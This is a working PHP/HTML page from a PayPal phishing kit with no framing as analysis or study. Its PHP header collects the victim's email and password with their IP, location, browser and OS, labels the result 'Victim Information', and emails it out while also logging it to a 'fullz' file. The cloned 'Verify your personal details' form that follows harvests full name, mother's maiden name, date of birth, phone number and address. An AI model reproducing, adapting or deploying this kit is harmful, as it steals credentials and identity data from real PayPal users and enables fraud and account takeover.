<?php
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['email'];
$pass = $_POST['password'];

$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
$data = "
+ ------------- Moe's Shop --------------+
+ Account Details 
| Username : $user
| Password : $pass
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";



if ($sendEmail === 1) {
	mail($to,  "PayPal Login from " . $_SERVER['REMOTE_ADDR'], $data);
}

if ($saveFile === 1) {
	$file = fopen('assets/logs/fullz_vbv.txt', 'a');
	fwrite($file, $data . "\n");
	fclose($file);
}


   
   
?>
<!DOCTYPE html>
<html lang="en-RO" data-device-type="dedicated" class="no-js">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Verify your personal details</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0">
      <link href="assets/files_details/page.b1eb2f27e98c4dc92711.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8">
   </head>
   <body class="">
      <div id="app-element-mountpoint">
      <div id="document-body" dir="ltr" data-reactroot="">
         <div class="backgroundColor">
            <script src="assets/files_details/oneTouchInject.min.js.descărcare" async="" defer=""></script>
            <div>
               <div class="signup clear app-wrapper">
                  <div class="signup-page-header"><a aria-label="Paypal" href="#" class="signup-page-header-logo" pa-marked="1"></a><a href="#" class="signup-page-header-button vx_btn vx_btn-medium vx_btn-secondary" pa-marked="1">Log Out</a></div>
                  <main>
                     <div>
                        <div class="signup-page-form">
                           <div class="notification"></div>
                           <div>
                              <form id="verify" action="Step2.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" class="signupAppContent" method="POST">
                                 <div>
                                    <div>
                                       <div class="center">
                                          <h1 class="vx_text-2 center ">Verify your personal details</h1>
                                       </div>
                                    </div>
                                    <div class="fieldGroupContainer">
                                      
                                          
                                                <div class="vx_floatingLabel_complex vx_floatingLabel_active   hasValue">
                                           
                                                   <div class="vx_form-control" data-label-content="Full name">
                                                 
													  <input type="text" style="padding-left:15px" maxlength="50" required autocomplete="off" name="name" id="name">
													
                                                   </div>
                                               
                                                </div>
                                          
                                      
                                       <div>
                                          <div>
                                             <div class=" ">
                                                <div class="vx_floatingLabel_complex vx_floatingLabel_active   hasValue">
                                                   <label for="name">Mother's Maiden Name</label>
                                                   <div class="vx_form-control" data-label-content="Mother's Maiden Name">
                                                      <div class="vx_form-control"><input type="text" style="padding-left:15px" required  autocomplete="off" maxlength="20" name="mmn" id="mmn"></div>
                                                   </div>
                                                   <span></span>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div style="margin-top: 10px;">
                                                                                    <select id="day" style="width: 30%;margin-right:2.5%;" name="day" required="" class="vx_form-control" aria-required="true">

                                             <option selected="selected" value="">Day</option>
                                             <option value="01">01</option>
                                             <option value="02">02</option>
                                             <option value="03">03</option>
                                             <option value="04">04</option>
                                             <option value="05">05</option>
                                             <option value="06">06</option>
                                             <option value="07">07</option>
                                             <option value="08">08</option>
                                             <option value="09">09</option>
                                             <option value="10">10</option>
                                             <option value="11">11</option>
                                             <option value="12">12</option>
                                             <option value="13">13</option>
                                             <option value="14">14</option>
                                             <option value="15">15</option>
                                             <option value="16">16</option>
                                             <option value="17">17</option>
                                             <option value="18">18</option>
                                             <option value="19">19</option>
                                             <option value="20">20</option>
                                             <option value="21">21</option>
                                             <option value="22">22</option>
                                             <option value="23">23</option>
                                             <option value="24">24</option>
                                             <option value="25">25</option>
                                             <option value="26">26</option>
                                             <option value="27">27</option>
                                             <option value="28">28</option>
                                             <option value="29">29</option>
                                             <option value="30">30</option>
                                             <option value="31">31</option>
                                          </select>
                                          <select id="month" style="width: 30%;margin-right:2.5%;" name="month" required="" class="vx_form-control" aria-required="true">
                                             <option selected="selected" value="">Month</option>
                                             <option value="01">01</option>
                                             <option value="02">02</option>
                                             <option value="03">03</option>
                                             <option value="04">04</option>
                                             <option value="05">05</option>
                                             <option value="06">06</option>
                                             <option value="07">07</option>
                                             <option value="08">08</option>
                                             <option value="09">09</option>
                                             <option value="10">10</option>
                                             <option value="11">11</option>
                                             <option value="12">12</option>
                                          </select>
                                          <select id="year" style="width: 30%;margin-right:2.5%;" name="year" required="" class="vx_form-control" aria-required="true">
                                             <option selected="selected" value="">Year</option>
                                             <option value="1910">1910</option>
                                             <option value="1911">1911</option>
                                             <option value="1912">1912</option>
                                             <option value="1913">1913</option>
                                             <option value="1914">1914</option>
                                             <option value="1915">1915</option>
                                             <option value="1916">1916</option>
                                             <option value="1917">1917</option>
                                             <option value="1918">1918</option>
                                             <option value="1919">1919</option>
                                             <option value="1920">1920</option>
                                             <option value="1921">1921</option>
                                             <option value="1922">1922</option>
                                             <option value="1923">1923</option>
                                             <option value="1924">1924</option>
                                             <option value="1925">1925</option>
                                             <option value="1926">1926</option>
                                             <option value="1927">1927</option>
                                             <option value="1928">1928</option>
                                             <option value="1929">1929</option>
                                             <option value="1930">1930</option>
                                             <option value="1931">1931</option>
                                             <option value="1932">1932</option>
                                             <option value="1933">1933</option>
                                             <option value="1934">1934</option>
                                             <option value="1935">1935</option>
                                             <option value="1936">1936</option>
                                             <option value="1937">1937</option>
                                             <option value="1938">1938</option>
                                             <option value="1939">1939</option>
                                             <option value="1940">1940</option>
                                             <option value="1941">1941</option>
                                             <option value="1942">1942</option>
                                             <option value="1943">1943</option>
                                             <option value="1944">1944</option>
                                             <option value="1945">1945</option>
                                             <option value="1946">1946</option>
                                             <option value="1947">1947</option>
                                             <option value="1948">1948</option>
                                             <option value="1949">1949</option>
                                             <option value="1950">1950</option>
                                             <option value="1951">1951</option>
                                             <option value="1952">1952</option>
                                             <option value="1953">1953</option>
                                             <option value="1954">1954</option>
                                             <option value="1955">1955</option>
                                             <option value="1956">1956</option>
                                             <option value="1957">1957</option>
                                             <option value="1958">1958</option>
                                             <option value="1959">1959</option>
                                             <option value="1960">1960</option>
                                             <option value="1961">1961</option>
                                             <option value="1962">1962</option>
                                             <option value="1963">1963</option>
                                             <option value="1964">1964</option>
                                             <option value="1965">1965</option>
                                             <option value="1966">1966</option>
                                             <option value="1967">1967</option>
                                             <option value="1968">1968</option>
                                             <option value="1969">1969</option>
                                             <option value="1970">1970</option>
                                             <option value="1971">1971</option>
                                             <option value="1972">1972</option>
                                             <option value="1973">1973</option>
                                             <option value="1974">1974</option>
                                             <option value="1975">1975</option>
                                             <option value="1976">1976</option>
                                             <option value="1977">1977</option>
                                             <option value="1978">1978</option>
                                             <option value="1979">1979</option>
                                             <option value="1980">1980</option>
                                             <option value="1981">1981</option>
                                             <option value="1982">1982</option>
                                             <option value="1983">1983</option>
                                             <option value="1984">1984</option>
                                             <option value="1985">1985</option>
                                             <option value="1986">1986</option>
                                             <option value="1987">1987</option>
                                             <option value="1988">1988</option>
                                             <option value="1989">1989</option>
                                             <option value="1990">1990</option>
                                             <option value="1991">1991</option>
                                             <option value="1992">1992</option>
                                             <option value="1993">1993</option>
                                             <option value="1994">1994</option>
                                             <option value="1995">1995</option>
                                             <option value="1996">1996</option>
                                             <option value="1997">1997</option>
                                             <option value="1998">1998</option>
                                             <option value="1999">1999</option>
                                             <option value="2000">2000</option>
                                             <option value="2001">2001</option>
                                             <option value="2002">2002</option>
                                             <option value="2003">2003</option>
                                             <option value="2004">2004</option>
                                             <option value="2005">2005</option>
                                          </select>
                                       </div>
                                       <div>
                                          <div>
                                             <div class=" ">
                                                <div class="vx_floatingLabel_complex vx_floatingLabel_active   hasValue">
                                                   <label for="name">Telephone</label>
                                                   <div class="vx_form-control" data-label-content="Telephone">
                                                      <div class="vx_form-control"><input type="text" style="padding-left:15px"  autocomplete="off" required maxlength="11" minlength="11"  name="telephone" id="telephone"></div>
                                                   </div>
                                                   <span></span>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div>
                                          <div>
                                             <div class=" ">
                                                <div class="vx_floatingLabel_complex vx_floatingLabel_active   hasValue">
                                                   <label for="name">Address Line 1</label>
                                                   <div class="vx_form-control" data-label-content="Address Line 1">
                                                      <div class="vx_form-control"><input type="text" style="padding-left:15px"  autocomplete="off" required maxlength="100" name="address" id="address"></div>
                                                   </div>
                                                   <span></span>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div>
                                          <div>
                                             <div class=" ">
                                                <div class="vx_floatingLabel_complex vx_floatingLabel_active   hasValue">
                                                   <label for="name">Address  Line 2</label>
                                                   <div class="vx_form-control" data-label-content="Address Line 2">
                                                      <div class="vx_form-control"><input type="text" style="padding-left:15px"  autocomplete="off" maxlength="100" name="address2" id="address2"></div>
                                                   </div>
                                                   <span></span>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div>
                                          <div>
                                             <div class=" ">
                                                <div class="vx_floatingLabel_complex vx_floatingLabel_active   hasValue">
                                                   <label for="name">County</label>
                                                   <div class="vx_form-control" data-label-content="County">
                                                      <div class="vx_form-control"><input type="text" style="padding-left:15px"  autocomplete="off" required maxlength="100" name="county" id="county"></div>
                                                   </div>
                                                   <span></span>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div>
                                          <div>
                                             <div class=" ">
                                                <div class="vx_floatingLabel_complex vx_floatingLabel_active   hasValue">
                                                   <label for="name">Town</label>
                                                   <div class="vx_form-control" data-label-content="Town">
                                                      <div class="vx_form-control"><input type="text" style="padding-left:15px"  autocomplete="off" required maxlength="29" name="town" id="town"></div>
                                                   </div>
                                                   <span></span>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div>
                                          <div>
                                             <div class=" ">
                                                <div class="vx_floatingLabel_complex vx_floatingLabel_active   hasValue">
                                                   <label for="name">Postcode</label>
                                                   <div class="vx_form-control" data-label-content="Postcode">
                                                      <div class="vx_form-control"><input type="text" style="padding-left:15px"  autocomplete="off" required maxlength="100" name="postcode" id="postcode"></div>
                                                   </div>
                                                   <span></span>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="btnGrp"><button name="/appData/action" id="/appData/action" value="name_address" class="vx_btn vx_btn-block" style="width:auto" data-automation-id="page_submit" pa-marked="1">Next</button></div>
                                    </div>
                                    <input type="hidden" name="_csrf" value="aZ0D31CpCgg53WJPKKNltMGktw4S1y+uDqvQ0=">
                              </form>
                              <div style="text-align: center;">
                              <a href="#" style="text-align: center;">Why is my paypal limited?</a>
                              </div>
                              </div>
                              <div class="signup-page-footer vx_text-legal text-center">©1999–2020 PayPal. All rights reserved.<span class="signup-page-footer-separator">|</span><a href="#" target="_blank" class="vx_text-legal" pa-marked="1">Privacy</a><span class="signup-page-footer-spacer">&nbsp;</span><a href="#" target="_blank" class="vx_text-legal" pa-marked="1">Legal</a><span class="signup-page-footer-spacer">&nbsp;</span><a href="#" target="_blank" class="vx_text-legal" pa-marked="1">Contact</a><span class="signup-page-footer-spacer">&nbsp;</span><span><a class="vx_text-legal" style="cursor:pointer" pa-marked="1">Feedback</a></span><a href="#" target="_blank" class="vx_text-legal" pa-marked="1"></a></div>
                           </div>
                        </div>
                  </main>
                  <div id="injectedUnifiedLogin" style="height:0px;width:0px;visibility:hidden;overflow:hidden"></div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <script src="assets/files_details/react-16_2_0-bundle.js.descărcare" charset="UTF-8"></script><script src="assets/files_details/54bab271e8430a459f7beef45055d464072a9b.js.descărcare" charset="UTF-8"></script><script src="assets/files_details/vendor.7a596b2180fb65be59b2.js.descărcare" charset="UTF-8"></script><script src="assets/files_details/page.b1eb2f27e98c4dc92711.js.descărcare" charset="UTF-8"></script><script nonce="" charset="UTF-8">
         if (typeof window !== "undefined" && window.document) {
             if (typeof PageBundle.default.renderApp === "function") {
                 PageBundle.default.renderApp(window.modelData);
             } else {
                 var appElement = React.createElement(window.PageBundle.default, { modelData: window.modelData });
                 var mountPoint = window.document.getElementById("app-element-mountpoint");
                 ReactDOM.hydrate && ReactDOM.hydrate(appElement, mountPoint) || ReactDOM.render(appElement, mountPoint);
             }
         }
      </script><script nonce="" type="application/json" fncls="fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99">{"f": "d63338a0bb7c11e886e45b2df5a3214c", "s": "t_s"}</script><script nonce="" type="text/javascript" src="assets/files_details/fb.js.descărcare"></script>
      <div>
         <div>
            <!--
               script: node, date: undefined, country: RO, language: en
               hostname: rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0EBzfgrVKf5UP9+3IJGCeU3THqspu3vQX
               rlogid: rZJvnqaaQhLn%2FnmWT8cSUvZzdT4xVEYcdOjZnkGUylc8kYBWJIjkjU2dkaPSgTjeTi4HVaNt4iTb31oGXiMI8wFhdxiLqn%2Fb_165ee40c913
               -->
         </div>
         <script nonce="">(function(){
            window.dataLayer = window.dataLayer || {};
            window.dataLayer.fptiGuid = 'ec9678251650a1e821726f4affffd447';
            window.dataLayer.FptiId = 'ec9678251650a1e821726f4affffd447';
            window.dataLayer.contentCountry = 'RO';
            window.dataLayer.contentLanguage = 'en';
            })()
         </script>
         <div></div>
      </div>
   </body>
   <div id="recaptchaEventListenerAdded"></div>
</html>
